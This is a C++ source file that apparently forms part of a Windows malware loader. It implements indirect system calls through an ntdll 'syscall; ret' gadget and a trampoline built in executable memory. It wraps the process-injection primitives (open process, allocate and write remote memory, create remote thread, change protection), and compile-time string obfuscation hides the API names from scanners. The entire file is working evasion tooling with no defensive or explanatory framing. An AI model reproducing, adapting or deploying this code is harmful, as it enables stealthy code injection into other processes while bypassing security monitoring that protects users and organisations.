#include "lge_syscalls.h"
#include "dynresolve.h"
#include <mutex>

#pragma pack(push, 1)
struct LgeTrampoline {
    unsigned char mov_r10_rcx[3];  
    unsigned char mov_eax[1];      
    DWORD         ssn;             
    unsigned char mov_r11[2];      
    uint64_t      gadget;          
    unsigned char jmp_r11[3];      
};
#pragma pack(pop)

namespace {
    std::mutex g_LgeMutex;
    uint8_t* g_Trampoline = nullptr;
    uint64_t g_Gadget = 0;
    bool     g_Ready = false;
}

DWORD g_SysNtOpenProcess = 0;
DWORD g_SysNtAllocateVirtualMemory = 0;
DWORD g_SysNtWriteVirtualMemory = 0;
DWORD g_SysNtFreeVirtualMemory = 0;
DWORD g_SysNtCreateThreadEx = 0;
DWORD g_SysNtClose = 0;
DWORD g_SysNtQueryInformationProcess = 0;
DWORD g_SysNtWaitForSingleObject = 0;
DWORD g_SysNtProtectVirtualMemory = 0;

static uint64_t LgeLocateGadget(HMODULE hNtdll) {
    if (!hNtdll) return 0;

    uint8_t* base = (uint8_t*)hNtdll;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    uint32_t expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRva) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + expRva);
    uint32_t* funcs = (uint32_t*)(base + exp->AddressOfFunctions);

    for (uint32_t i = 0; i < exp->NumberOfFunctions; ++i) {
        uint8_t* p = base + funcs[i];

        for (int j = 0; j < 32; ++j) {
            if (p[j] == 0x0F && p[j + 1] == 0x05 && p[j + 2] == 0xC3) {
                return (uint64_t)(p + j);
            }
        }
    }
    return 0;
}

static bool LgeBuildTrampoline() {
    if (g_Trampoline) return true;

    static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
    static constexpr auto obfAlloc = MAKE_OBF("NtAllocateVirtualMemory");

    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll).c_str());
    if (!hNtdll) return false;

    using pNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    pNtAllocateVirtualMemory fnAlloc =
        (pNtAllocateVirtualMemory)DynGetProcAddress(hNtdll, DECR_STR(obfAlloc).c_str());
    if (!fnAlloc) return false;

    PVOID mem = nullptr;
    SIZE_T region = 4096;
    if (fnAlloc((HANDLE)-1, &mem, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) != 0 || !mem) {
        return false;
    }

    g_Trampoline = (uint8_t*)mem;
    return true;
}

bool LgeInitialize() {
    std::lock_guard<std::mutex> lock(g_LgeMutex);
    if (g_Ready) return true;

    static constexpr auto obfNtOpenProcess = MAKE_OBF("NtOpenProcess");
    static constexpr auto obfNtAllocateVirtualMemory = MAKE_OBF("NtAllocateVirtualMemory");
    static constexpr auto obfNtWriteVirtualMemory = MAKE_OBF("NtWriteVirtualMemory");
    static constexpr auto obfNtFreeVirtualMemory = MAKE_OBF("NtFreeVirtualMemory");
    static constexpr auto obfNtCreateThreadEx = MAKE_OBF("NtCreateThreadEx");
    static constexpr auto obfNtClose = MAKE_OBF("NtClose");
    static constexpr auto obfNtQueryInformationProcess = MAKE_OBF("NtQueryInformationProcess");
    static constexpr auto obfNtWaitForSingleObject = MAKE_OBF("NtWaitForSingleObject");
    static constexpr auto obfNtProtectVirtualMemory = MAKE_OBF("NtProtectVirtualMemory");

    g_SysNtOpenProcess = GetSyscallNumber(DECR_STR(obfNtOpenProcess).c_str());
    g_SysNtAllocateVirtualMemory = GetSyscallNumber(DECR_STR(obfNtAllocateVirtualMemory).c_str());
    g_SysNtWriteVirtualMemory = GetSyscallNumber(DECR_STR(obfNtWriteVirtualMemory).c_str());
    g_SysNtFreeVirtualMemory = GetSyscallNumber(DECR_STR(obfNtFreeVirtualMemory).c_str());
    g_SysNtCreateThreadEx = GetSyscallNumber(DECR_STR(obfNtCreateThreadEx).c_str());
    g_SysNtClose = GetSyscallNumber(DECR_STR(obfNtClose).c_str());
    g_SysNtQueryInformationProcess = GetSyscallNumber(DECR_STR(obfNtQueryInformationProcess).c_str());
    g_SysNtWaitForSingleObject = GetSyscallNumber(DECR_STR(obfNtWaitForSingleObject).c_str());
    g_SysNtProtectVirtualMemory = GetSyscallNumber(DECR_STR(obfNtProtectVirtualMemory).c_str());

    if (g_SysNtOpenProcess == 0 || g_SysNtAllocateVirtualMemory == 0 ||
        g_SysNtWriteVirtualMemory == 0 || g_SysNtFreeVirtualMemory == 0 ||
        g_SysNtCreateThreadEx == 0 || g_SysNtClose == 0 ||
        g_SysNtWaitForSingleObject == 0 || g_SysNtProtectVirtualMemory == 0) {
        return false;
    }

    static constexpr auto obfNtdll = MAKE_OBF("ntdll.dll");
    HMODULE hNtdll = DynGetModuleHandle(DECR_STR(obfNtdll).c_str());
    g_Gadget = LgeLocateGadget(hNtdll);
    if (!g_Gadget) return false;

    if (!LgeBuildTrampoline()) return false;

    g_Ready = true;
    return true;
}

NTSTATUS LgeInvoke(DWORD ssn,
    void* a1, void* a2, void* a3, void* a4,
    void* a5, void* a6, void* a7, void* a8,
    void* a9, void* a10, void* a11, void* a12)
{
    if (!g_Ready && !LgeInitialize()) {
        return (NTSTATUS)0xC0000001L; 
    }

    std::lock_guard<std::mutex> lock(g_LgeMutex);

    LgeTrampoline* t = (LgeTrampoline*)g_Trampoline;
    t->mov_r10_rcx[0] = 0x4C; t->mov_r10_rcx[1] = 0x8B; t->mov_r10_rcx[2] = 0xD1;
    t->mov_eax[0] = 0xB8;
    t->ssn = ssn;
    t->mov_r11[0] = 0x49; t->mov_r11[1] = 0xBB;
    t->gadget = g_Gadget;
    t->jmp_r11[0] = 0x41; t->jmp_r11[1] = 0xFF; t->jmp_r11[2] = 0xE3;

    using Proto = NTSTATUS(NTAPI*)(
        void*, void*, void*, void*,
        void*, void*, void*, void*,
        void*, void*, void*, void*);
    Proto fn = (Proto)g_Trampoline;

    return fn(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
}

extern "C" {

NTSTATUS SyscallNtOpenProcess(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
{
    return LgeInvoke(g_SysNtOpenProcess,
        (void*)ProcessHandle, (void*)(uintptr_t)DesiredAccess,
        (void*)ObjectAttributes, (void*)ClientId,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
    return LgeInvoke(g_SysNtAllocateVirtualMemory,
        (void*)ProcessHandle, (void*)BaseAddress, (void*)(uintptr_t)ZeroBits,
        (void*)RegionSize, (void*)(uintptr_t)AllocationType, (void*)(uintptr_t)Protect,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)
{
    return LgeInvoke(g_SysNtWriteVirtualMemory,
        (void*)ProcessHandle, (void*)BaseAddress, (void*)Buffer,
        (void*)(uintptr_t)NumberOfBytesToWrite, (void*)NumberOfBytesWritten,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtFreeVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType)
{
    return LgeInvoke(g_SysNtFreeVirtualMemory,
        (void*)ProcessHandle, (void*)BaseAddress, (void*)RegionSize,
        (void*)(uintptr_t)FreeType,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
    PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
    SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList)
{
    return LgeInvoke(g_SysNtCreateThreadEx,
        (void*)ThreadHandle, (void*)(uintptr_t)DesiredAccess,
        (void*)ObjectAttributes, (void*)ProcessHandle,
        (void*)StartRoutine, (void*)Argument,
        (void*)(uintptr_t)CreateFlags, (void*)(uintptr_t)ZeroBits,
        (void*)(uintptr_t)StackSize, (void*)(uintptr_t)MaximumStackSize,
        (void*)AttributeList, nullptr);
}

NTSTATUS SyscallNtClose(HANDLE Handle)
{
    return LgeInvoke(g_SysNtClose,
        (void*)Handle,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtQueryInformationProcess(
    HANDLE ProcessHandle, ULONG ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength)
{
    return LgeInvoke(g_SysNtQueryInformationProcess,
        (void*)ProcessHandle, (void*)(uintptr_t)ProcessInformationClass,
        (void*)ProcessInformation, (void*)(uintptr_t)ProcessInformationLength,
        (void*)ReturnLength,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtWaitForSingleObject(
    HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout)
{
    return LgeInvoke(g_SysNtWaitForSingleObject,
        (void*)Handle, (void*)(uintptr_t)Alertable, (void*)Timeout,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

NTSTATUS SyscallNtProtectVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect)
{
    return LgeInvoke(g_SysNtProtectVirtualMemory,
        (void*)ProcessHandle, (void*)BaseAddress, (void*)RegionSize,
        (void*)(uintptr_t)NewProtect, (void*)OldProtect,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
}

}
